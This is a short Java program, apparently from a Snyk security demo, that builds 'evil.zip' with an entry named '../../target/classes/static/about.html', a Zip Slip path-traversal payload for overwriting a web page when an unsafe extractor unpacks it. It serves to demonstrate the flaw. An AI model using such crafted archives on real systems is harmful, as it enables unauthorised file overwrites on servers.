package io.snyk.demo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Test {


    public static void main(String[] args) throws IOException {
        String content = new String(Files.readAllBytes(Paths.get("evil.txt")));
        System.out.println(content);


        File f = new File("evil.zip");
        ZipOutputStream out = new ZipOutputStream(new FileOutputStream(f));
        insertZipEntry(out, "good.txt", "This is a good textfile");
        insertZipEntry(out,
                "../../target/classes/static/about.html",
                "<html><h1>About<h1></html>");
        out.close();
    }


    private static void insertZipEntry(ZipOutputStream out, String filename, String body) throws IOException{
        StringBuilder sb = new StringBuilder();
        sb.append(body);

        ZipEntry e = new ZipEntry(filename);
        out.putNextEntry(e);
        byte[] data = sb.toString().getBytes();
        out.write(data, 0, data.length);
        out.closeEntry();
    }


//    public void createZipFile(String zipFileName, List<File> files) throws IOException{
//        File zipFile = new File(zipFileName);
//        ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(zipFile));
//
//        files.forEach(file -> insertIntoZipFile(zipOutputStream, file));
//        zipOutputStream.close();
//
//    }
//
//    private void insertIntoZipFile(ZipOutputStream zipOutputStream, File file) {
//        ZipEntry entry = new ZipEntry(file.getName());
//
//
//    }


}
